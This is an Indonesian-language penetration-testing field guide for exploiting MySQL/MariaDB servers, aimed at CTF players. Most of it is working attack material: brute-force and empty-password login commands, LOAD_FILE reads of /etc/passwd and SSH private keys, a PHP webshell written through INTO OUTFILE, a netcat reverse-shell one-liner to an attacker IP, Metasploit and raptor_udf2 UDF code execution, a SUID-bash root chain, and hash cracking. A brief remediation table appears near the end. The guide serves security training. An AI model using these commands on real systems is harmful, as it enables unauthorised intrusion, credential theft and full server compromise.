---
id: "14a"
title: "14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "14a_mysql_workflow.md"
refs_out: ["01","03","05","06","07","12","14b","14c","44"]
refs_in: ["04","05","06","07","08","10","11","13","14b","14c","14d","17","17a","17b","17c","18","19","21","22","23","24","25","26","32","35","37","42","44","59","60","61","62"]
---

# 14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Database Service Exploitation & Privilege Escalation Workflow
SERVICE TARGET     : MySQL & MariaDB Relational Database Management System (RDBMS)
DEFAULT PORTS      : TCP 3306 (Standard MySQL/MariaDB)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)
==================================================================================
```

---

## 🧠 BAGIAN 1: MYSQL FUNDAMENTALS

### 1.1 Apa itu MySQL dan MariaDB? (Kenapa Dibahas Bersama?)

**MySQL** adalah salah satu sistem manajemen basis data relasional (*Relational Database Management System / RDBMS*) paling populer di dunia, yang umumnya menjadi komponen database utama dalam arsitektur web **LAMP Stack** (Linux, Apache, MySQL, PHP).

**MariaDB** adalah *fork* independen (*community-driven*) yang dibuat oleh pengembang asli MySQL (Michael "Monty" Widenius) setelah MySQL diakuisisi oleh Oracle Corporation. 
* Di sebagian besar distribusi Linux modern (termasuk Debian dan Parrot OS), paket `mysql-server` dan `mysql-client` secara otomatis digantikan oleh MariaDB.
* Keduanya memiliki protokol jaringan biner, struktur file, perintah query SQL, port default, dan vektor eksploitasi yang **99% identik**, sehingga dipelajari dalam satu kesatuan workflow.

```text
+=============================================================================+
|                      ANALOGI LEMARI ARSIP KANTOR PUSAT                      |
+=============================================================================+
|                                                                             |
|  [ SERVER MYSQL (Lemari Arsip Besar) ]                                      |
|  └── [ DATABASES (Laci / Map Folder Utama, misal: 'wordpress_db') ]         |
|      └── [ TABLES (Buku Lembar Kerja Excel, misal: 'wp_users') ]            |
|          └── [ ROWS / COLUMNS (Baris Data Spesifik: user, password_hash) ]   |
|                                                                             |
+=============================================================================+
```

---

### 1.2 Port 3306 TCP sebagai Entry Point

Port **3306 TCP** adalah port standar default layanan MySQL/MariaDB.
* **Local vs. Remote Access**: Secara default di instalasi Linux produksi, MySQL sering kali di-*bind* hanya ke `127.0.0.1:3306` (hanya bisa diakses lokal dari dalam server).
* **Vektor CTF & Misconfiguration**: Jika administrator mengatur konfigurasi `bind-address = 0.0.0.0`, port 3306 akan terbuka ke seluruh jaringan dan dapat diakses langsung oleh penyerang dari luar.

---

### 1.3 Sistem Pengguna MySQL (`username@host`)

Sistem otentikasi MySQL sangat unik karena hak akses tidak hanya ditentukan oleh nama user, melainkan kombinasi ketat antara **Username** dan **Host/IP asal koneksi**:

```text
Format Identitas: 'username'@'host'
```

* **`'root'@'localhost'`**: User `root` hanya boleh login jika koneksi berasal dari mesin lokal (`127.0.0.1` atau UNIX socket).
* **`'root'@'%'`**: Karakter `%` adalah wildcard (*any host*). Akun `root` diizinkan login dari **IP mana pun di seluruh dunia**!
  > [!CAUTION]
  > **CRITICAL MISCONFIGURATION:**  
  > Menyetel `root@%` dengan password kosong atau password lemah adalah kesalahan fatal yang memungkinkan pengambilalihan instan seluruh database dari jaringan luar.

---

### 1.4 Sistem Hak Akses (Privileges) Penting untuk Pentester

```text
+-----------------------+-------------------------------------------------------------------------------+
| Privilege             | Dampak Keamanan & Vektor Eksploitasi                                          |
+-----------------------+-------------------------------------------------------------------------------+
| `ALL PRIVILEGES`      | Kontrol penuh atas seluruh database, tabel, dan fungsi administratif server.   |
+-----------------------+-------------------------------------------------------------------------------+
| `FILE`                | **SANGAT BERBAHAYA**. Memberikan hak membaca dan menulis file sistem OS       |
|                       | melalui fungsi `LOAD_FILE()` dan klausa `INTO OUTFILE`.                       |
+-----------------------+-------------------------------------------------------------------------------+
| `SUPER`               | Mengizinkan modifikasi variabel global runtime (seperti `secure_file_priv`),  |
|                       | mematikan koneksi klien lain, dan mendaftarkan UDF (User Defined Functions).  |
+-----------------------+-------------------------------------------------------------------------------+
```

---

### 1.5 Authentication Plugins: `mysql_native_password` vs. `auth_socket`

* **`mysql_native_password`**: Metode otentikasi klasik di mana password di-hash menggunakan algoritma SHA-1 ganda dan diverifikasi saat login.
* **`auth_socket` (atau `unix_socket`)**: Metode default di Debian/Ubuntu/Parrot OS modern. Plugin ini memeriksa apakah user Linux lokal yang mengeksekusi CLI cocok dengan nama user MySQL:
  * Jika Anda adalah user Linux `root` (atau menjalankan `sudo`), Anda bisa langsung mengetik `sudo mysql` dan masuk ke MySQL tanpa dimintai password sama sekali!

---

### 1.6 Direktori Data Fisik (`datadir`)
* Lokasi default di Linux: `/var/lib/mysql/`
* Setiap database direpresentasikan sebagai sub-folder di direktori ini, berisi file data tabel fisik (`.ibd`, `.frm`, `.myd`, `.myi`).

---

## 🛠️ BAGIAN 2: TOOL ARSENAL MYSQL

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                        KECEPATAN   PENGGUNAAN DI CTF
=======================================================================================================
mysql CLI          Klien baris perintah interaktif     Instan      Login interaktif, eksekusi query
nmap (NSE)         Audit banner, hash, dan user        Cepat       Pengecekan password kosong & info
nxc (NetExec)      Batch credential validator          Sangat Cepat Validasi kredensial & spray
hydra              Brute force password jaringan       Sedang      Kamus kata sandi port 3306
sqlmap             Otomasi SQLi & direct DB query      Tinggi      Direct DB dump & UDF `--os-shell`
mysqldump          Ekspor & cadangan seluruh database  Tinggi      Pencurian data massal (Looting)
=======================================================================================================
```

---

### 2.1 `mysql` CLI Client — Klien Utama di Parrot OS

* **Instalasi Paket Klien di Parrot OS:**
```bash
which mysql || sudo apt update && sudo apt install mariadb-client -y
```

> [!IMPORTANT]
> **ATURAN SINTAKS BENDERA PASSWORD (`-p` FLAG):**
> 1. **`-p` (Interaktif Tanpa Nilai Langsung)**:  
>    `mysql -h $TARGET -u root -p` ➔ Sistem akan meminta password secara tersembunyi.
> 2. **`-pPASSWORD` (Langsung Tanpa Spasi!)**:  
>    `mysql -h $TARGET -u root -pPassword123` ➔ Password langsung dikirimkan (**DILARANG ADA SPASI** antara `-p` dan kata sandi!).
> 3. **`-p''` atau `--password=''` (Password Kosong/Blank)**:  
>    `mysql -h $TARGET -u root -p''` ➔ Untuk menguji login tanpa kata sandi.

* **Perintah Koneksi Praktis**:
```bash
# 1. Connect interaktif standar:
mysql -h 10.10.11.200 -u root -p

# 2. Connect dengan password langsung ke database tertentu:
mysql -h 10.10.11.200 -P 3306 -u root -p'Pass123!' -D wordpress_db

# 3. Eksekusi satu query langsung tanpa masuk ke prompt interaktif (Non-Interactive Mode):
mysql -h 10.10.11.200 -u root -p'Pass123!' -e "SHOW DATABASES; SELECT user,host FROM mysql.user;"

# 4. Eksekusi query batch dari file script .sql:
mysql -h 10.10.11.200 -u root -p'Pass123!' < exploit_query.sql
```

---

### 2.2 Nmap NSE Scripts untuk MySQL

```bash
# 1. Deteksi versi detail, kapabilitas, dan salt otentikasi:
nmap -p 3306 --script mysql-info 10.10.11.200

# 2. Cek apakah ada akun default dengan PASSWORD KOSONG (Kritis!):
nmap -p 3306 --script mysql-empty-password 10.10.11.200

# 3. Dump daftar database jika memiliki kredensial:
nmap -p 3306 --script mysql-databases --script-args "mysqluser=root,mysqlpass=''" 10.10.11.200

# 4. Dump hash password user MySQL langsung dari Nmap:
nmap -p 3306 --script mysql-dump-hashes --script-args "mysqluser=root,mysqlpass=''" 10.10.11.200

# 5. Enumerasi seluruh daftar pengguna MySQL:
nmap -p 3306 --script mysql-users --script-args "mysqluser=root,mysqlpass=''" 10.10.11.200
```

* **Contoh Output Nyata Nmap `mysql-empty-password`**:
```text
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty password
```

---

### 2.3 NetExec (`nxc`) & Hydra — Credential Testing

```bash
# 1. Validasi password kosong via NetExec:
nxc mysql 10.10.11.200 -u root -p ''

# 2. Validasi dengan password tertentu:
nxc mysql 10.10.11.200 -u root -p 'Password123!'

# 3. Validasi lokal auth socket jika di target:
nxc mysql 10.10.11.200 -u root -p '' --local-auth

# 4. Alternatif Brute Force Menggunakan Hydra:
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.11.200 -t 4 -V

# 5. One-Liner Test Cepat Menggunakan MySQL CLI Langsung:
mysql -h 10.10.11.200 -u root -p'' -e "SELECT 1;" 2>/dev/null && echo "[+] LOGIN BERHASIL!" || echo "[-] Gagal"
```

---

### 2.4 Metasploit Framework MySQL Modules

```bash
# 1. Version Scanner:
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_version; set RHOSTS 10.10.11.200; run; exit"

# 2. Credential Login & Password Spray:
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS 10.10.11.200; set USERNAME root; set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt; run; exit"

# 3. Direct SQL Query Execution:
msfconsole -q -x "use auxiliary/admin/mysql/mysql_sql; set RHOSTS 10.10.11.200; set USERNAME root; set PASSWORD ''; set SQL 'SELECT version();'; run; exit"

# 4. Exploitasi RCE Berbasis UDF (User Defined Functions):
msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS 10.10.11.200; set USERNAME root; set PASSWORD ''; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; run; exit"
```

---

### 2.5 `sqlmap` & `mysqldump`

```bash
# 1. Koneksi langsung sqlmap ke port 3306 tanpa melalui aplikasi web:
sqlmap -d "mysql://root:@10.10.11.200:3306/mysql" --dbs

# 2. sqlmap interaktif OS Shell via MySQL UDF otomatis:
sqlmap -d "mysql://root:@10.10.11.200:3306/mysql" --os-shell

# 3. Ekspor seluruh database ke file lokal (.sql dump):
mysqldump -h 10.10.11.200 -u root -p'' --all-databases > full_database_dump.sql

# 4. Ekspor satu database target spesifik:
mysqldump -h 10.10.11.200 -u root -p'' wordpress_db > wordpress_loot.sql
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Operasional di Terminal Parrot OS:
export TARGET="10.10.11.200"
export DB_USER="root"
export DB_PASS=""
```

---

### FASE 1: DETEKSI MYSQL (PORT 3306)

Tujuan: Memverifikasi apakah port 3306 terbuka, mengekstrak banner versi, dan memastikan apakah remote connection diizinkan.

```bash
# 1. Scan Nmap Port 3306
sudo nmap -sS -p 3306 -sV $TARGET -oN nmap_mysql.txt

# 2. Evaluasi Banner & Versi
nmap -p 3306 --script mysql-info $TARGET
```

---

### FASE 2: AUTENTIKASI — TESTING KREDENSIAL & BYPASS

#### 1. Uji Login Password Kosong (`root:blank`)
Di banyak lab CTF, database yang di-setup terburu-buru belum menjalankan script `mysql_secure_installation`, sehingga user `root` tidak memiliki kata sandi:
```bash
mysql -h $TARGET -u root -p''
```

#### 2. Kredensial Maintenance Rahasia: `/etc/mysql/debian.cnf`
Jika Anda telah memiliki shell awal di target (misal via web exploit / SSH user biasa), selalu periksa file konfigurasi sistem Debian/Ubuntu:
```bash
# Di shell target:
cat /etc/mysql/debian.cnf
```
* **Contoh Output**:
```text
[client]
host     = localhost
user     = debian-sys-maint
password = A1b2C3d4E5f6G7h8
socket   = /var/run/mysqld/mysqld.sock
```
* **Cara Menggunakan**: Akun `debian-sys-maint` memiliki izin penuh setara root! Gunakan kredensial ini untuk login lokal:
```bash
mysql -u debian-sys-maint -p'A1b2C3d4E5f6G7h8'
```

#### 3. Cek Miskinfigurasi `skip-grant-tables`
Jika administrator mengaktifkan opsi darurat `skip-grant-tables` di konfigurasi daemon, seluruh otentikasi dinonaktifkan:
```bash
# Di shell target, cek apakah flag ini aktif:
grep -r "skip.grant" /etc/mysql/ 2>/dev/null

# Jika ada, Anda bisa login tanpa user & password:
mysql -u root
```

---

### FASE 3: MYSQL RECONNAISSANCE (9 QUERY WAJIB)

Segera setelah berhasil masuk ke prompt `mysql>`, eksekusi 9 query berikut secara berurutan:

```sql
-- 1. Identifikasi Versi Lengkap & Arsitektur OS Server:
SELECT version();

-- 2. Cek Pengguna Aktif & Host Asal Koneksi Kita:
SELECT user(), current_user();

-- 3. Tampilkan Seluruh Database yang Tersedia:
SHOW databases;

-- 4. Masuk ke Database Tertentu & Tampilkan Daftar Tabel:
USE database_name;
SHOW tables;

-- 5. Berburu Tabel Kredensial Akun (Users / Admin / Accounts):
SELECT * FROM users LIMIT 5;
SELECT * FROM wp_users LIMIT 5;

-- 6. Audit Hak Akses (Privileges) Pengguna Saat Ini:
SHOW GRANTS;

-- 7. Cek Lokasi Direktori Fisik Database:
SELECT @@datadir;

-- 8. CEK VARIABEL secure_file_priv (KUNCI UTAMA READ/WRITE FILE):
SELECT @@global.secure_file_priv;

-- 9. Tampilkan Variabel secure_file_priv Format Bersih:
SHOW VARIABLES LIKE 'secure_file_priv';
```

#### ⚠️ Cara Membaca Variabel `secure_file_priv`:
* **Nilai `NULL`**: Fitur baca/tulis file dinonaktifkan sepenuhnya oleh server. `LOAD_FILE()` dan `INTO OUTFILE` tidak akan bekerja.
* **Nilai `''` (String Kosong)**: **TIKET EMAS (CRITICAL VULN)**. Server **TIDAK MEMBATASI** direktori! Anda bebas membaca dan menulis file di seluruh sistem (termasuk web root `/var/www/html/`).
* **Nilai `/var/lib/mysql-files/`**: Operasi baca/tulis hanya diizinkan di dalam folder direktori spesifik tersebut.

---

### FASE 4: FILE READ VIA MYSQL (`LOAD_FILE`)

Jika user memiliki hak `FILE` dan `secure_file_priv` bernilai string kosong `''`:

```sql
-- 1. Baca daftar akun sistem Linux:
SELECT LOAD_FILE('/etc/passwd');

-- 2. Baca file konfigurasi web untuk mencari password database / API key:
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');

-- 3. Berburu SSH Private Key pengguna:
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');
SELECT LOAD_FILE('/root/.ssh/id_rsa');

-- 4. Baca informasi kernel dan sistem operasi:
SELECT LOAD_FILE('/proc/version');
```

* **Menyimpan Output File Langsung ke Terminal Parrot OS**:
```bash
mysql -h $TARGET -u root -p'' -e "SELECT LOAD_FILE('/etc/passwd');" | sed '1d' > /tmp/target_passwd.txt
```

---

### FASE 5: FILE WRITE VIA MYSQL (`INTO OUTFILE` WEBSHELL)

Jika target menjalankan web server (Port 80/443 Apache/Nginx) dan direktori web root dapat ditulis (*writable*) oleh user `mysql`:

```sql
-- 1. Tulis webshell PHP ke web root:
SELECT '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}else{echo "shell ready";} ?>' 
INTO OUTFILE '/var/www/html/cmd.php';
```

* **Validasi Eksekusi dari Terminal Parrot OS**:
```bash
# 1. Uji respons webshell:
curl -s http://$TARGET/cmd.php

# 2. Eksekusi perintah sistem (RCE):
curl -s "http://$TARGET/cmd.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 3. Spawn Reverse Shell ke Netcat Listener:
# Di Terminal 1 (Parrot OS): nc -lvnp 4444
# Di Terminal 2:
curl -G "http://$TARGET/cmd.php" --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f"
```

> [!TIP]
> **Mengatasi Error 1086 (File already exists):**  
> Klausul `INTO OUTFILE` menolak menimpa file yang sudah ada di disk. Jika muncul error `ERROR 1086 (HY000): File '...' already exists`, cukup ganti nama file tujuan (misal `shell2.php` atau `cmd123.php`).

---

### FASE 6: HASH EXTRACTION & CRACKING

```sql
-- Format MySQL Versi Lama (< 5.7):
SELECT user, password, host FROM mysql.user;

-- Format MySQL Versi Modern (>= 5.7 / MariaDB):
SELECT user, authentication_string, host FROM mysql.user;
```

* **Format Hash yang Sering Ditemukan**:
  * **MySQL Native (Double SHA-1)**: Diawali karakter bintang `*` sepanjang 40 digit hex (contoh: `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19`).
  * **WordPress Hash (`phpass`)**: Diawali `$P$` atau `$H$` (MD5 berulang).
  * **Joomla / Drupal / Modern Apps**: Diawali `$2y$` atau `$2a$` (bcrypt).

```bash
# 1. Cracking MySQL 4.1/5.x Hash (Hashcat Mode 300):
echo "*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19" > mysql.hash
hashcat -m 300 mysql.hash /usr/share/wordlists/rockyou.txt

# 2. Cracking WordPress Hash (Hashcat Mode 400):
hashcat -m 400 wp.hash /usr/share/wordlists/rockyou.txt

# 3. Cracking Bcrypt Hash (Hashcat Mode 3200):
hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt
```

---

### FASE 7: UDF (USER DEFINED FUNCTIONS) — RCE

UDF adalah pustaka dinamis (*shared object `.so`*) yang dikompilasi dari bahasa C dan dimuat ke dalam MySQL untuk menambahkan fungsi eksternal baru yang mengeksekusi perintah shell tingkat kernel.

#### Prasyarat UDF RCE:
1. Akun MySQL memiliki hak akses `SUPER` atau `FILE`.
2. Variabel `plugin_dir` diketahui dan dapat ditulis.

#### 1. Periksa Lokasi Direktori Plugin
```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- Contoh output: /usr/lib/mysql/plugin/
```

#### 2. Dapatkan Source Code UDF Resmi
Di Parrot OS, exploit UDF standar tersedia di Searchsploit:
```bash
# Cari dan ekstrak exploit UDF raptor_udf2:
searchsploit -m 1518
mv 1518.c raptor_udf2.c

# Kompilasi library shared object .so:
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

#### 3. Upload & Aktifkan UDF di MySQL
```sql
-- Buat tabel sementara untuk menampung biner:
USE mysql;
CREATE TABLE foo(line blob);
INSERT INTO foo values(load_file('/tmp/raptor_udf2.so'));

-- Tulis biner langsung ke folder plugin:
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- Daftarkan fungsi eksekusi sistem:
CREATE FUNCTION sys_exec RETURNS int SONAME 'raptor_udf2.so';

-- Eksekusi perintah sistem (Root RCE jika MySQL berjalan sebagai root):
SELECT sys_exec('id > /tmp/udf_proof.txt');
```

#### 4. Jalur Pintas via `sqlmap` (Sangat Direkomendasikan di CTF)
Jika Anda tidak ingin melakukan kompilasi C manual, gunakan sqlmap yang memiliki modul UDF otomatis:
```bash
sqlmap -d "mysql://root:@$TARGET:3306/mysql" --os-shell
```

---

## 🔓 BAGIAN 4: MYSQL POST-EXPLOITATION

### 4.1 Ekstraksi Kredensial CMS Web Aplikasi
```sql
-- WordPress:
SELECT user_login, user_pass, user_email FROM wordpress.wp_users;

-- Joomla:
SELECT username, password, email FROM joomla.jos_users;

-- Drupal:
SELECT name, pass, mail FROM drupal.users;
```

### 4.2 Lateral Movement via Credential Reuse
Kata sandi yang ditemukan dari database MySQL atau konfigurasi web sering kali digunakan kembali (*password reuse*) oleh administrator untuk akun sistem operasi:
```bash
# Coba login SSH menggunakan kredensial database yang ditemukan:
ssh root@$TARGET
ssh admin@$TARGET
```

---

## 🔗 BAGIAN 5: MYSQL ATTACK CHAINING

```text
+=============================================================================+
|                       MYSQL ATTACK CHAINING TAXONOMY                        |
+=============================================================================+
```

### 🔗 Chain 1: Port 3306 Open ➔ Root No Password ➔ `LOAD_FILE` ➔ SSH Key Foothold

```text
[ Port 3306 Terbuka ] ──> mysql -h $TARGET -u root -p'' (Login Berhasil!)
                                     │
                                     ▼
[ SELECT LOAD_FILE ] ──> Baca file: /home/admin/.ssh/id_rsa
                                     │
                                     ▼
[ Parrot OS Host ] ──> chmod 600 id_rsa ──> ssh -i id_rsa admin@$TARGET
                                     │
                                     ▼
                        [ USER ACCESS OBTAINED! ]
```

---

### 🔗 Chain 2: Web App DB Credential ➔ MySQL Login ➔ `INTO OUTFILE` ➔ Web RCE

```text
[ Baca config.php via LFI ] ──> db_user='dbadmin', db_pass='Secr3tP@ss!'
                                     │
                                     ▼
[ MySQL Login ] ──> mysql -h $TARGET -u dbadmin -p'Secr3tP@ss!'
                                     │
                                     ▼
[ INTO OUTFILE ] ──> Tulis webshell ke /var/www/html/shell.php
                                     │
                                     ▼
[ curl RCE ] ──> curl "http://$TARGET/shell.php?cmd=whoami"
                                     │
                                     ▼
                        [ WEB SHELL REVERSE ACCESS! ]
```

---

### 🔗 Chain 3: MySQL Foothold ➔ Searchsploit UDF ➔ Root Shell via Database Daemon

```text
[ Hak Akses FILE & SUPER ] ──> searchsploit -m 1518 (raptor_udf2.c)
                                     │
                                     ▼
[ Kompilasi & Dumpfile ] ──> Upload raptor_udf2.so ke /usr/lib/mysql/plugin/
                                     │
                                     ▼
[ CREATE FUNCTION ] ──> sys_exec('chmod u+s /bin/bash')
                                     │
                                     ▼
                        [ INSTANT ROOT COMPROMISE! ]
```

---

### 🔗 Chain 4: File Konfigurasi `debian.cnf` ➔ Hak Admin MySQL ➔ Dump Hashes

```text
[ Low-Priv Shell ] ──> cat /etc/mysql/debian.cnf (Password Plaintext Terbaca!)
                                     │
                                     ▼
[ Login Maintenance ] ──> mysql -u debian-sys-maint -p'PLAINTEXT_PASS'
                                     │
                                     ▼
[ Dump mysql.user ] ──> Ekstrak seluruh password hash pengguna
                                     │
                                     ▼
                        [ CREDENTIAL REUSE KE SSH! ]
```

---

## 🛡️ BAGIAN 6: COMMON MYSQL MISCONFIGURATIONS & REMEDIATION

```text
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| Konfigurasi Rentan        | Risiko Keamanan                   | Vektor Eksploitasi                | Rekomendasi Mitigasi / Perbaikan         |
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| `root` Tanpa Password     | Akses administratif penuh tanpa   | `mysql -u root -p''` langsung     | Jalankan `mysql_secure_installation`      |
|                           | verifikasi kredensial.            | masuk ke konsol database.         | dan tetapkan password yang kuat.          |
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| `bind-address = 0.0.0.0`  | Port 3306 terbuka ke publik       | Koneksi remote langsung dari luar | Atur `bind-address = 127.0.0.1` di        |
|                           | (akses jaringan tidak dibatasi).  | tanpa perlu SSH tunnel/proxy.     | `/etc/mysql/mariadb.conf.d/50-server.cnf`.|
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| `secure_file_priv = ""`   | Operasi baca dan tulis file       | Membaca `/etc/passwd` via         | Tetapkan direktori ketat, contoh:         |
|                           | tidak dibatasi di sistem file.    | `LOAD_FILE` & webshell injection. | `secure_file_priv = /var/lib/mysql-files`.|
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| Hak `FILE` untuk User     | Pengguna biasa aplikasi web bisa  | Menulis webshell ke folder publik | Cabut hak file:                           |
| Non-Administratif         | membahayakan server OS.           | `/var/www/html/`.                 | `REVOKE FILE ON *.* FROM 'user'@'%';`     |
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
| `skip-grant-tables` Aktif | Otentikasi dimatikan total.       | Siapa saja bisa login sebagai     | Hapus flag `skip-grant-tables` dari       |
|                           |                                   | root tanpa user dan password.     | konfigurasi `my.cnf`.                     |
+---------------------------+-----------------------------------+-----------------------------------+-------------------------------------------+
```

---

## 🌳 BAGIAN 7: MASTER DECISION TREE MYSQL

```text
                         [PORT 3306 (MYSQL) TERBUKA]
                                      │
                                      ▼
                        [UJI LOGIN ROOT TANPA PASSWORD]
                         mysql -h $TARGET -u root -p''
                                      │
                     ┌────────────────┴────────────────┐
                     │                                 │
                [BERHASIL]                          [GAGAL]
                     │                                 │
                     │                     ┌───────────┴───────────┐
                     │                     │                       │
                     │            [TEST CREDENTIAL REUSE]    [BRUTE FORCE]
                     │            Password dari SMB/SSH/Web  hydra / nxc mysql
                     │                     │                       │
                     │                     └───────────┬───────────┘
                     │                                 │
                     └────────────────┬────────────────┘
                                      │
                         [BERHASIL MASUK MYSQL CLI]
                                      │
                                      ▼
                           [RECONNAISSANCE 9 QUERY]
                        SHOW DATABASES; SHOW GRANTS;
                                      │
                        [CEK secure_file_priv]
                                      │
                 ┌────────────────────┴────────────────────┐
                 │                                         │
        [NILAI: '' (KOSONG)]                         [NILAI: NULL]
                 │                                         │
     ┌───────────┴───────────┐                     [CEK plugin_dir]
     │                       │                             │
[LOAD_FILE]             [INTO OUTFILE]             ┌───────┴───────┐
Baca /etc/passwd        Tulis Webshell PHP         │               │
Baca wp-config.php      ke /var/www/html/    [WRITABLE]      [READ ONLY]
     │                       │                     │               │
     │                       ▼                     ▼               ▼
     │               [CURL WEBSHELL]         [UDF EXPLOIT]   [DUMP DATA SAJA]
     │               Eksekusi RCE!           searchsploit    Ekstrak hash
     │                       │               raptor_udf2.so  dari tabel users
     │                       │                     │               │
     └───────────────────────┼─────────────────────┴───────────────┘
                             │
                             ▼
                 [SYSTEM ACCESS COMPROMISED!]
```

---

## 🔧 BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING (10 ERROR SOLUTIONS)

### 1. `ERROR 1045 (28000): Access denied for user 'root'@'IP' (using password: NO)`
* **Penyebab**: User `root` tidak memiliki password kosong atau IP Anda tidak diizinkan di whitelist `user@host`.
* **Solusi CLI**: Coba gunakan user maintenance sistem atau uji password lain:
```bash
mysql -h $TARGET -u debian-sys-maint -p
```

---

### 2. `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option`
* **Penyebab**: Variabel `secure_file_priv` disetel ke `NULL` atau direktori spesifik, sehingga operasi `LOAD_FILE` atau `INTO OUTFILE` diblokir.
* **Solusi**: Periksa direktori yang diizinkan menggunakan:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
Jika bernilai folder tertentu (misal `/var/lib/mysql-files/`), tulis file hanya ke folder tersebut.

---

### 3. `ERROR 1130 (HY000): Host 'IP' is not allowed to connect to this MySQL server`
* **Penyebab**: Tabel `mysql.user` tidak menyertakan wildcard `%` untuk host asal IP penyerang.
* **Solusi CLI**: Akses port 3306 melalui Local Port Forwarding SSH (Pivoting):
```bash
ssh -L 33306:127.0.0.1:3306 user@$TARGET -N -f
mysql -h 127.0.0.1 -P 33306 -u root -p
```

---

### 4. `ERROR 2003 (HY000): Can't connect to MySQL server on 'IP' (111 Connection refused)`
* **Penyebab**: MySQL hanya mendengarkan di interface localhost (`bind-address = 127.0.0.1`) atau firewall memblokir port 3306.
* **Solusi**: Periksa konfigurasi di target `/etc/mysql/mariadb.conf.d/50-server.cnf` atau gunakan SSH tunnel.

---

### 5. Fungsi `SELECT LOAD_FILE(...)` Menghasilkan Nilai `NULL`
* **Penyebab**: File yang diminta tidak ada, izin file di OS server tidak mengizinkan user `mysql` membacanya, atau ukuran file melebihi `max_allowed_packet`.
* **Solusi**: Coba baca file publik seperti `/etc/passwd` atau `/proc/version` untuk memverifikasi apakah fungsi berjalan normal.

---

### 6. `ERROR 1086 (HY000): File '...' already exists`
* **Penyebab**: Klausa `INTO OUTFILE` menolak menimpa file yang sudah ada di disk.
* **Solusi**: Ganti nama file tujuan:
```sql
SELECT '[WEBSHELL_PAYLOAD]' INTO OUTFILE '/var/www/html/shell_v2.php';
```

---

### 7. `ERROR 1 (HY000): Can't create/write to file '...' (Errcode: 13 - Permission denied)`
* **Penyebab**: User sistem operasi `mysql` tidak memiliki hak izin tulis (*write permission*) pada direktori yang dituju.
* **Solusi**: Alihkan penulisan file ke direktori yang bersifat world-writable seperti `/tmp/` atau `/var/tmp/`:
```sql
SELECT '[PAYLOAD]' INTO OUTFILE '/tmp/script.sh';
```

---

### 8. `ERROR 1126 (HY000): Can't open shared library 'raptor_udf2.so'`
* **Penyebab**: Pustaka UDF tidak berada di dalam `plugin_dir`, atau arsitektur biner (32-bit vs 64-bit) tidak cocok dengan arsitektur server.
* **Solusi**: Kompilasi ulang biner C di lingkungan yang sama atau gunakan modul otomatis sqlmap `--os-shell`.

---

### 9. Query MySQL Mengalami Hang / Freeze Saat Eksekusi
* **Penyebab**: Query meminta data terlalu besar tanpa pembatasan, atau tabel sedang dikunci (*table lock*).
* **Solusi**: Selalu gunakan klausa `LIMIT` saat melakukan eksplorasi:
```sql
SELECT * FROM large_table LIMIT 10;
```

---

### 10. `ERROR 2013 (HY000): Lost connection to MySQL server during query`
* **Penyebab**: Batas waktu koneksi jaringan (*timeout*) habis atau paket data melebihi buffer.
* **Solusi CLI**: Tambahkan argumen timeout pada koneksi client:
```bash
mysql -h $TARGET -u root -p --connect-timeout=60 --net-buffer-length=16384
```

---

## 🏆 BAGIAN 9: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: Anonymous MySQL Login ➔ WordPress DB Dump ➔ Hash Crack ➔ SSH Foothold

**Target**: HackTheBox — WordPress Machine

#### Step 1: Login MySQL Tanpa Password
```bash
mysql -h 10.10.10.150 -u root -p''
```

#### Step 2: Identifikasi Database WordPress & Ekstraksi Hash
```sql
SHOW databases;
USE wordpress;
SELECT user_login, user_pass FROM wp_users;
```
* **Output**:
```text
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$B987654321fedcba0123456789abcde |
+------------+------------------------------------+
```

#### Step 3: Cracking Password Hash Menggunakan Hashcat
```bash
echo '$P$B987654321fedcba0123456789abcde' > wp_admin.hash
hashcat -m 400 wp_admin.hash /usr/share/wordlists/rockyou.txt
# Output Berhasil Di-crack: admin:Winter2024!
```

